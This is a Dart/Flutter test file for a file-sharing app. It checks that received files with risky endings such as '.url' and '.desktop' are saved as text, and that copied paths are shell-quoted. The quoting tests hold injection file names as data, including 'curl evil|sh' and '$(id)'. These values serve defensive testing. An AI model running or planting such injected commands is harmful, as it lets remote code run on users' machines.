import 'package:flutter_rust_bridge/flutter_rust_bridge_for_generated.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:fogata/src/app_state.dart';
import 'package:fogata/src/l10n.dart';
import 'package:fogata/src/rust/frb_generated.dart';

/// A core that notes what it is asked to save and answers where it went, as the core names
/// a file that would act on its own when shown: with an ending that makes it text.
class _Core implements RustLibApi {
  final asked = <Map<String, Object>>[];
  bool fail = false;

  String _saved(String name, String dir) {
    if (fail) throw AnyhowException('cannot save $name');
    return '$dir/$name.txt';
  }

  @override
  Future<String> crateApiAppSaveReceivedBytes({
    required List<int> bytes,
    required String name,
    required String dir,
  }) async {
    asked.add({'bytes': bytes, 'name': name, 'dir': dir});
    return _saved(name, dir);
  }

  @override
  Future<String> crateApiAppSaveReceivedFile({
    required String path,
    required String name,
    required String dir,
  }) async {
    asked.add({'path': path, 'name': name, 'dir': dir});
    return _saved(name, dir);
  }

  @override
  dynamic noSuchMethod(Invocation invocation) =>
      throw UnimplementedError('${invocation.memberName}');
}

void main() {
  final core = _Core();
  setUpAll(() => RustLib.initMock(api: core));
  setUp(() {
    core.asked.clear();
    core.fail = false;
  });

  AppState state() => AppState('/nonexistent/fogata-save-test')
    ..prefs.downloadsDir = '/home/ana/Downloads'
    ..roomState.previews['f'] = Uint8List.fromList([1, 2, 3]);

  // The name as it was shared goes to the core, which alone makes it safe; what is said is
  // where the core put it.
  test(
    'a picture is saved by the core under the name it was shared with',
    () async {
      final s = state();
      await s.savePicture('f', 'share.url');
      expect(core.asked, [
        {
          'bytes': [1, 2, 3],
          'name': 'share.url',
          'dir': '/home/ana/Downloads',
        },
      ]);
      expect(
        s.toasts.list.single.text,
        l10n.appSavedTo('/home/ana/Downloads/share.url.txt'),
      );
      expect(s.toasts.list.single.path, '/home/ana/Downloads/share.url.txt');
      expect(s.toasts.list.single.error, isFalse);
    },
  );

  test('a video is saved by the core from where it is played', () async {
    final s = state();
    await s.saveVideo('/data/videos/ab12.mp4', 'start.desktop');
    expect(core.asked, [
      {
        'path': '/data/videos/ab12.mp4',
        'name': 'start.desktop',
        'dir': '/home/ana/Downloads',
      },
    ]);
    expect(s.toasts.list.single.path, '/home/ana/Downloads/start.desktop.txt');
  });

  test(
    'nothing is saved without a downloads folder, nor a picture not shown',
    () async {
      final s = state()..prefs.downloadsDir = null;
      await s.savePicture('f', 'lake.jpg');
      await s.saveVideo('/data/videos/ab12.mp4', 'clip.mp4');
      await state().savePicture('other', 'lake.jpg');
      expect(core.asked, isEmpty);
    },
  );

  test('a save that fails says so', () async {
    core.fail = true;
    final s = state();
    await s.savePicture('f', 'lake.jpg');
    expect(s.toasts.list.single.error, isTrue);
    expect(s.toasts.list.single.path, isNull);
  });

  test('a copied path a shell would run something from is quoted', () {
    expect(
      pastablePath('/home/a/Downloads/photo (1).png'),
      '/home/a/Downloads/photo (1).png',
    );
    expect(
      pastablePath('/d/report; curl evil|sh #.pdf'),
      "'/d/report; curl evil|sh #.pdf'",
    );
    expect(pastablePath("/d/it's \$(id).txt"), "'/d/it'\\''s \$(id).txt'");
    expect(pastablePath(r'C:\d\a & b.txt', windows: true), r'"C:\d\a & b.txt"');
    expect(pastablePath(r'C:\d\plain.txt', windows: true), r'C:\d\plain.txt');
  });
}
